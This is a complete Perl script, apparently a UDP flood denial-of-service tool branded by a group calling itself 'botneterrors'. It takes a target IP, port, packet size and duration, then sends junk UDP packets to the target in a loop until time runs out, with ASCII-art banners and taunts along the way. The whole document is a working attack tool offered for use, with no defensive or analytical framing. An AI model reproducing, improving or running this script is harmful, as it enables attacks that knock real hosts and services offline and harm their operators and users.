#!/usr/bin/perl
 
use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;
print BOLD BLACK "IP\n";
print BOLD RED "port\n";
print BOLD BLACK "packets";
print BOLD RED  "seconds\n";
 
############
#botneterros
############
 
use Socket;
use strict;
 
my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);
 
print BOLD RED <<EOTEXT;
 
                       running newgens
            ,gaaaaaaaagaaaaaaaaaaaaagaaaaaaaag,
           ,aP8b    _,dYba,       ,adPb,_    d8Ya,
         ,aP"  Yb_,dP"   "Yba, ,adP"   "Yb,_dP  "Ya,
       ,aP"    _88"         )888(         "88_    "Ya,
     ,aP"   _,dP"Yb      ,adP"8"Yba,      dP"Yb,_   "Ya,
   ,aPYb _,dP8    Yb  ,adP"   8   "Yba,  dP    8Yb,_ dPYa,
 ,aP"  YdP" dP     YbdP"      8      "YbdP     Yb "YbP  "Ya,
I8aaaaaa8aaa8baaaaaa88aaaaaaaa8aaaaaaaa88aaaaaad8aaa8aaaaaa8I
`Yb,   d8a, Ya      d8b,      8      ,d8b      aP ,a8b   ,dP'
  "Yb,dP "Ya "8,   dI "Yb,    8    ,dP" Ib   ,8" aP" Yb,dP"
    "Y8,   "YaI8, ,8'   "Yb,  8  ,dP"   `8, ,8IaP"   ,8P"
      "Yb,   `"Y8ad'      "Yb,8,dP"      `ba8P"'   ,dP"
        "Yb,    `"8,        "Y8P"        ,8"'    ,dP"
          "Yb,    `8,         8         ,8'    ,dP"
            "Yb,   `Ya        8        aP'   ,dP"
              "Yb,   "8,      8      ,8"   ,dP"
                "Yb,  `8,     8     ,8'  ,dP"   
                  "Yb, `Ya    8    aP' ,dP"     
                    "Yb, "8,  8  ,8" ,dP"
                      "Yb,`8, 8 ,8',dP"
                        "Yb,Ya8aP,dP"
                          "Y88888P"
                            "Y8P"
                              "
  
 
                  BotnetErrors IS DADDY ;)
EOTEXT


print BOLD RED<<EOTEXT;
*Don't Flex newgens*
*skiqs Perl Script*
*made by skiqs*
EOTEXT
 
use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;
print "~ botneterrors dropping newgens~ $ip " . ($port ? $port : "random") . "-" .
  ($size ? "$size-byte" : "Got No wifi Bitch!?") . "
~ Getting ran by botneterrors
~ #botneterros is daddy ~ " .
  ($time ? " for $time seconds" : "") . "\n";
print "Break with Ctrl-C\n" unless $time;  
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500000-64)+64) ;
  $pport = $port ? $port : int(rand(1500000))+1;
 
send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport,
 $iaddr));}       